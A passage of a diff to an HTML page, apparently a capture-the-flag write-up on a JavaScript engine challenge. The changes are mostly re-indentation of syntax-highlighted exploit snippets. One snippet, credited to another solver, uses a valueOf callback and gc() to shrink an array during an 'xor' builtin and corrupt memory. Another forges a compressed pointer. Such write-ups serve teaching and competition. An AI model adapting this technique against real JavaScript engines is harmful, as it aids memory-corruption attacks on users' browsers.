+      <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Set the lowest bit -&gt; compressed pointer</span>
+    } 
+  });
 <!---->
-    <span class="jsConKw">return</span> <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>];
+  <span class="jsConKw">return</span> <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>];
 }</div>
 </div>
 
@@ -1642,26 +1780,26 @@ Another approach to exploiting the xor I saw in a few solves was changing the le
 <div class="jsConsole">
 	<div class="jsConCode"><span class="jsConNull">// snippet from rdjgr's exploit code</span>
 <span class="jsConKw">function</span> <span class="jsConIdx">pwn</span>() {
-    <span class="jsConKw">let</span> <span class="jsConIdx">num</span> = {};
-    <span class="jsConKw">let</span> <span class="jsConIdx">size</span> = <span class="jsConValIn">0x12</span>;
-    <span class="jsConKw">let</span> <span class="jsConIdx">num_rets</span> = <span class="jsConValIn">0x10</span>;
-    <span class="jsConKw">let</span> <span class="jsConIdx">a</span> = [];
-    <span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConVar">size</span>; <span class="jsConVar">i</span>++) {
-        <span class="jsConVar">a</span>.<span class="jsConFun">push</span>(<span class="jsConValIn">1.1</span>);
-    }
-    <span class="jsConKw">var</span> <span class="jsConIdx">rets</span> = [{<span class="jsConFun">a</span>: <span class="jsConValIn">1.1</span>}];
-    <span class="jsConVar">num</span>.<span class="jsConFun">valueOf</span> = <span class="jsConKw">function</span>() {
-        <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"valueof called"</span>);
-        <span class="jsConVar">a</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">1</span>;
-        <span class="jsConVar">gc</span>();
-        <span class="jsConVar">rets</span>.<span class="jsConFun">push</span>({<span class="jsConFun">b</span>: <span class="jsConValIn">1.1</span>});
+  <span class="jsConKw">let</span> <span class="jsConIdx">num</span> = {};
+  <span class="jsConKw">let</span> <span class="jsConIdx">size</span> = <span class="jsConValIn">0x12</span>;
+  <span class="jsConKw">let</span> <span class="jsConIdx">num_rets</span> = <span class="jsConValIn">0x10</span>;
+  <span class="jsConKw">let</span> <span class="jsConIdx">a</span> = [];
+  <span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConVar">size</span>; <span class="jsConVar">i</span>++) {
+    <span class="jsConVar">a</span>.<span class="jsConFun">push</span>(<span class="jsConValIn">1.1</span>);
+  }
+  <span class="jsConKw">var</span> <span class="jsConIdx">rets</span> = [{<span class="jsConFun">a</span>: <span class="jsConValIn">1.1</span>}];
+  <span class="jsConVar">num</span>.<span class="jsConFun">valueOf</span> = <span class="jsConKw">function</span>() {
+    <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"valueof called"</span>);
+    <span class="jsConVar">a</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">1</span>;
+    <span class="jsConVar">gc</span>();
+    <span class="jsConVar">rets</span>.<span class="jsConFun">push</span>({<span class="jsConFun">b</span>: <span class="jsConValIn">1.1</span>});
 <!---->
-        <span class="jsConKw">return</span> <span class="jsConValIn">0x40</span>;
-    };
+    <span class="jsConKw">return</span> <span class="jsConValIn">0x40</span>;
+  };
 <!---->
-    <span class="jsConVar">a</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">num</span>);
-    <span class="jsConVar">rets</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">900</span>
-    <span class="jsConKw">return</span> <span class="jsConVar">rets</span>
+  <span class="jsConVar">a</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">num</span>);
+  <span class="jsConVar">rets</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">900</span>
+  <span class="jsConKw">return</span> <span class="jsConVar">rets</span>
 }</div>
 </div>
 
